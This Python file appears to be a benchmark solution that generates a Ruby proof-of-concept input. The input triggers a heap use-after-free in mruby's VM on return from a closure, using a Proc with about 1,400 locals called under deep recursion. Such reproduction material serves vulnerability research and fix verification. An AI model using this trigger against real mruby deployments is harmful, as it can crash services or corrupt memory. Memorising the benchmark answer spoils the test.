import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Use-After-Free in mruby's VM (specifically OP_RETURN).
        # It is triggered when mrb_stack_extend is called during the return from a closure (Proc),
        # causing a stack reallocation while the 'regs' pointer is still pointing to the old stack.
        # To trigger this, we need:
        # 1. A Proc with many local variables (nlocals > 0 and large enough to force extension).
        # 2. A deep recursion stack to ensure the stack is near its capacity/limit, forcing realloc.

        # Based on the ground-truth length (7270 bytes), we estimate around 1400 locals.
        # "v0=v1=...=vN=0" is efficient packing.
        n_locals = 1400
        locals_chain = "=".join([f"v{i}" for i in range(n_locals)]) + "=0"

        # The PoC code
        poc = f"""
def r(n, &b)
  if n > 0
    r(n-1, &b)
  else
    b.call
  end
end

def t
  p = Proc.new {{
    {locals_chain}
    return
  }}
  r(1000, &p)
end

t
"""
        return poc.encode('utf-8')